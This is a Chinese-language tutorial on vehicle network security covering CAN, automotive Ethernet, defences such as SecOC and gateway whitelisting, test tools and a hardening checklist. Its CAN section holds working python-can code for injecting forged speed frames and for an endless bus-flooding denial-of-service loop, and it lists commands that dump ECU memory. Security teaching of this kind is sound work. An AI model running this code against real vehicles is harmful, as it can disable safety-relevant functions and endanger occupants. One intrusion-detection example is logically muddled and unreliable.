# 车载总线安全：CAN/LIN/FlexRay/车载以太网 攻击与防御

---

## 一、CAN 总线协议

### 1.1 CAN 帧结构

```
CAN 2.0B 扩展帧 (29位标识符):

┌─────┬─────┬──────┬─────┬──────┬───────┬─────┬─────┬─────┐
│ SOF │ ID  │ IDE  │ SRR │ CTRL │ DATA  │ CRC │ ACK │ EOF │
│ 1b  │ 11/ │ 1b   │ 1b  │ 6b   │ 0-64b │ 15b │ 2b  │ 7b  │
│     │ 29b │      │     │  (DLC)│       │     │     │     │
└─────┴─────┴──────┴─────┴──────┴───────┴─────┴─────┴─────┘

关键特性：
  - 广播性质：一条消息所有节点都收到
  - 优先级仲裁：ID越小，优先级越高
  - 无源地址：消息不包含发送者标识(匿名性)
  - 最大8字节数据域(CAN FD: 64字节)
  - 速率：CAN 2.0 ≤1Mbps / CAN FD ≤8Mbps
  
安全问题：
  ✗ 无认证：任何节点可发送任意ID的CAN消息
  ✗ 无加密：消息明文传输
  ✗ 无重放保护：同一消息可无限重复发送
  ✗ 无完整性校验：CRC仅检测传输错误(不防篡改)
  ✗ 匿名：无法追溯消息发送者
```

### 1.2 CAN 注入攻击

```python
# CAN注入攻击演示 (使用SocketCAN + python-can)
# ⚠️ 仅在隔离测试台/授权测试使用！

import can
import time

# 初始化CAN接口
bus = can.Bus(channel='can0', interface='socketcan')

# 发送 CAN 消息示例
# 消息ID: 0x123 → 车速消息(假设)
# 数据: [0x00, 0x64] → 车速100km/h

# 1. 正常读取(嗅探CAN流量)
for msg in bus:
    print(f"ID: {hex(msg.arbitration_id)}, Data: {msg.data.hex()}")

# 2. 注入伪造消息
fake_speed = can.Message(
    arbitration_id=0x123,  # 车速ID
    data=[0x00, 0xFF],     # 车速255km/h
    is_extended_id=False
)
bus.send(fake_speed)
# → 仪表盘显示255km/h！

# 3. CAN DoS攻击
# 持续发送高优先级(ID=0x000)消息 → 占用总线 → 正常消息被阻塞
dos_msg = can.Message(arbitration_id=0x000, data=[0x00]*8)
while True:
    bus.send(dos_msg)
    # 极小延迟 → 由于CAN仲裁机制(0x000优先级最高)
    # 所有其他ECU的消息无法获得总线仲裁→功能失效
```

### 1.3 CAN 防御

```
CAN 防御技术演进：

1. CAN IDS (入侵检测)
   - 物理层：检测电压异常、阻抗异常
   - 协议层：检测异常频率/异常ID/异常数据范围
   - 应用层：检测物理逻辑矛盾(车速>0但刹车=0不合理)

2. SecOC (Secure Onboard Communication, AUTOSAR)
   在CAN消息末尾附加MAC(基于HMAC-SHA256):
   原始CAN帧 = ID + DLC + DATA
   SecOC帧  = ID + DLC + DATA + MAC + FV(Freshness Value)
   
   每个ECU预置对称密钥 → 发送方计算MAC → 
   接收方验证MAC → 验证新鲜值防重放

3. CAN XL (下一代 CAN)
   正在制定中：原生支持安全认证和加密

4. 网络架构隔离
   关键动力总线与信息娱乐总线物理隔离
   网关：仅路由白名单中的CAN ID
```

---

## 二、车载以太网

```
车载以太网 (Automotive Ethernet):
  100BASE-T1 / 1000BASE-T1 (单对双绞线)
  替代CAN用于高带宽场景(ADAS/IVI/OTA)

协议栈：
  Ethernet → VLAN → TCP/UDP
                            ↓
  SOME/IP (Scalable Service-Oriented Middleware over IP)
    → 服务发现(Service Discovery) + 远程过程调用(RPC)
  DoIP (Diagnostics over IP)
    → 替代传统CAN诊断(UDS on CAN → UDS on DoIP)

SOME/IP 安全：
  - 默认无安全 → 任何设备可"发现"服务
  - PROTECTION：SOME/IP-SD × SecOC TLS结合
  - 防火墙：网关限制SOME/IP服务访问

DoIP 安全：
  - 诊断接口如果在公网可达(错误配置)→ 远程刷写固件
  - 必须：TLS 1.2+ + 双向证书认证
  - 必须：诊断防火墙(只允许授权诊断仪)
```

---

## 三、工具链

### 3.1 CAN 工具

```bash
# SocketCAN (Linux内核原生CAN支持)
sudo ip link set can0 up type can bitrate 500000
candump can0         # 抓取CAN流量
cansend can0 123#00FF  # 发送CAN消息

# SavvyCAN (图形化CAN分析)
# https://github.com/collin80/SavvyCAN

# ICSim (仪表盘模拟器 + CAN攻击演示)
# https://github.com/zombieCraig/ICSim
# 启动虚拟仪表盘 + 虚拟CAN控制器 → 练习注入攻击

# Caring Caribou (车载安全测试工具)
# https://github.com/CaringCaribou/caringcaribou
# UDS诊断服务发现/扫描/Dump
cc.py uds discovery      # 发现ECU
cc.py uds services       # 枚举UDS服务
cc.py uds dump           # 通过UDS dump ECU内存
```

### 3.2 车辆安全测试平台

```
硬件：
├── CANable/Macchina M2 (USB-CAN适配器)
├── Kvaser/Vector (专业CAN接口)
├── OBD-II Breakout Box (引出CAN引脚)
└── 逻辑分析仪 (Saleae/DSLogic)

软件：
├── BusMaster (开源CAN分析)
├── Vehicle Spy (商业整车网络分析)
├── CANoe (Vector — 行业标准)
└── Wireshark (with SocketCAN plugin)
```

---

## 四、Checklist

- [ ] CAN网络拓扑绘制(各总线ECU清单)
- [ ] CAN IDS部署(物理层+协议层异常检测)
- [ ] 域间网关CAN ID白名单
- [ ] IVI CAN隔离(IVI不应直接接入动力CAN)
- [ ] OBD-II端口访问控制(带外认证)
- [ ] SecOC实现(关键ECU通信认证)
- [ ] 诊断防火墙(DoIP/TLS认证+访问控制)
- [ ] 车载以太网安全(SOME/IP/DoIP服务限制)
- [ ] CAN FD 更新计划(CAN 2.0 → CAN FD)
